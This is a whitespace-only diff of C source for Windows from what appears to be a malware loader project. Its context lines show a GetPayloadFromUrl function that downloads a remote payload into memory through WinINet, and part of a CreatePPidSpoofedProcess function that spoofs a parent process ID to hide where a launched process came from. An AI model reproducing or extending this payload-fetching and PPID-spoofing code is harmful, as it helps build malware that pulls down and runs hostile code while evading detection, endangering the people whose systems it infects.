@@ -23,14 +23,14 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
 	BOOL		bSTATE = TRUE;
 
 	HINTERNET	hInternet = NULL,
-		hInternetFile = NULL;
+			hInternetFile = NULL;
 
 	DWORD		dwBytesRead = NULL;
 
 	SIZE_T		sSize = NULL; 	 			// Used as the total payload size
 
-	PBYTE		pBytes = NULL,					// Used as the total payload heap buffer
-		pTmpBytes = NULL;					// Used as the tmp buffer (of size 1024)
+	PBYTE		pBytes = NULL,				// Used as the total payload heap buffer
+			pTmpBytes = NULL;			// Used as the tmp buffer (of size 1024)
 
 	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
 	hInternet = InternetOpenW(L"gerby", NULL, NULL, NULL, NULL);
@@ -102,9 +102,9 @@ _EndOfFunction:
 	if (hInternetFile)
 		InternetCloseHandle(hInternetFile);										// Closing handle
 	if (hInternet)
-		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
+		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);						// Closing Wininet connection
 	if (pTmpBytes)
-		LocalFree(pTmpBytes);													// Freeing the temp buffer
+		LocalFree(pTmpBytes);												// Freeing the temp buffer
 	return bSTATE;
 }
 
@@ -143,7 +143,7 @@ BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName,
 
 	//-------------------------------------------------------------------------------
 
-		// this will fail with ERROR_INSUFFICIENT_BUFFER / 122
+	// this will fail with ERROR_INSUFFICIENT_BUFFER / 122
 	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
 
 	// allocating enough memory
